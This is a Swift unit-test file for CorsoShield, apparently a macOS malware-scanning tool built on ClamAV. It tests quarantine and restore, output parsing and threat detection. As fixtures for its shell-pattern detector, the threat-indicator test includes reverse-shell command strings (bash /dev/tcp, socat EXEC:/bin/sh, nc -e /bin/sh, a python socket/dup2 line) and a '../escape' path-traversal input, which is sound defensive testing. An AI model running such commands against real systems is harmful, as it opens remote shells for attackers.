import XCTest
@testable import CorsoShield
final class CoreTests: XCTestCase {
    func testQuarantineRestore() throws {
        let fm = FileManager.default
        let root = fm.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let previous = ProcessInfo.processInfo.environment["CORSO_TEST_ROOT"]
        setenv("CORSO_TEST_ROOT", root.path, 1)
        defer { if let previous = previous { setenv("CORSO_TEST_ROOT", previous, 1) } else { unsetenv("CORSO_TEST_ROOT") }; try? fm.removeItem(at: root) }
        try Shield.setup()
        try fm.createDirectory(at: fm.homeDirectoryForCurrentUser.appendingPathComponent("Documents/Codex"), withIntermediateDirectories: true)
        let sample = fm.homeDirectoryForCurrentUser.appendingPathComponent("Documents/Codex/corso-test-" + UUID().uuidString)
        defer { try? fm.removeItem(at: sample) }
        try Data("harmless restore fixture".utf8).write(to: sample)
        let d = Detection(path: sample.path, signature: "Test", digest: try Shield.digest(sample))
        try Shield.quarantine(d)
        XCTAssertFalse(fm.fileExists(atPath: sample.path))
        let id = try fm.contentsOfDirectory(atPath: root.appendingPathComponent("Quarantine").path).first!
        try Shield.restore(id)
        XCTAssertEqual(try Shield.digest(sample), d.digest)
        XCTAssertThrowsError(try Shield.restore(id))
        XCTAssertThrowsError(try Shield.restore("../escape"))
        try Data("changed".utf8).write(to: sample)
        XCTAssertThrowsError(try Shield.quarantine(d))
        let link = sample.appendingPathExtension("link")
        defer { try? fm.removeItem(at: link) }
        try fm.createSymbolicLink(at: link, withDestinationURL: sample)
        XCTAssertThrowsError(try Shield.quarantine(Detection(path: link.path, signature: "Test", digest: try Shield.digest(sample))))
    }
    func testThreatIndicators() {
        let pids = ThreatChecks.networkPIDs("p42\nn127.0.0.1:1->203.0.113.1:2\np43\nn*:80\np44\nn[::1]:1->[::1]:2\n")
        XCTAssertEqual(pids, Set([42, 44]))
        let processes = "42 1 /bin/zsh -i\n43 1 /bin/zsh -l\n44 1 /usr/bin/python3 -c socket.connect(x);os.dup2(s,0)\n45 1 /usr/bin/curl https://example.com\n"
        let findings = ThreatChecks.processFindings(processes, connected: pids)
        XCTAssertEqual(findings.count, 2)
        XCTAssertEqual(ThreatChecks.processFindings("99 1 /bin/sh -c echo harmless", connected: []).count, 0)
        XCTAssertTrue(ThreatChecks.shellPattern("bash -c /dev/tcp/example/1234"))
        XCTAssertTrue(ThreatChecks.shellPattern("socat TCP:example:1234 EXEC:/bin/sh"))
        XCTAssertTrue(ThreatChecks.shellPattern("nc example 1234 -e /bin/sh"))
        XCTAssertFalse(ThreatChecks.shellPattern("python3 normal_script.py"))
        XCTAssertFalse(ThreatChecks.shellPattern("ssh user@example"))
        XCTAssertTrue(ThreatChecks.sipFinding("System Integrity Protection status: disabled.") != nil)
        XCTAssertTrue(ThreatChecks.sipFinding("System Integrity Protection status: enabled.") == nil)
        XCTAssertTrue(ThreatChecks.sipFinding("unrecognized probe failure") == nil)
    }
    func testParser() {
        let d = Shield.parse("/tmp/a: b.txt: Test.Signature FOUND\n/tmp/clean: OK\nERROR: denied")
        XCTAssertEqual(d.count, 1)
        XCTAssertEqual(d[0].path, "/tmp/a: b.txt")
        XCTAssertEqual(d[0].signature, "Test.Signature")
    }
    func testExitStatus() {
        for (code, text) in [(Int32(0), "No detections"), (1, "Detections"), (2, "Incomplete")] {
            XCTAssertTrue(Report(targets: [], exitCode: code, output: "", detections: []).status.hasPrefix(text))
        }
    }
    func testRealClamAVWithIsolatedHarmlessSignature() throws {
        try Shield.setup()
        let binary = try Shield.binary("clamscan")
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let sample = dir.appendingPathComponent("sample.txt")
        try Data("CorsoShield harmless integration fixture".utf8).write(to: sample)
        let db = dir.appendingPathComponent("test.hdb")
        // A local signature for this harmless fixture; never use this test DB for actual protection.
        let bytes = try Data(contentsOf: sample)
        let md5 = Insecure.MD5.hash(data: bytes).map { String(format: "%02x", $0) }.joined()
        try "\(md5):\(bytes.count):CorsoShield.Test\n".write(to: db, atomically: true, encoding: .utf8)
        let (code, output) = try Shield.run(binary, ["--database=\(db.path)", sample.path], log: dir.appendingPathComponent("log"))
        XCTAssertEqual(code, 1, output)
        XCTAssertEqual(Shield.parse(output).count, 1)
        try Data("Clean file".utf8).write(to: sample)
        let (clean, _) = try Shield.run(binary, ["--database=\(db.path)", sample.path], log: dir.appendingPathComponent("log"))
        XCTAssertEqual(clean, 0)
    }
}
import CryptoKit
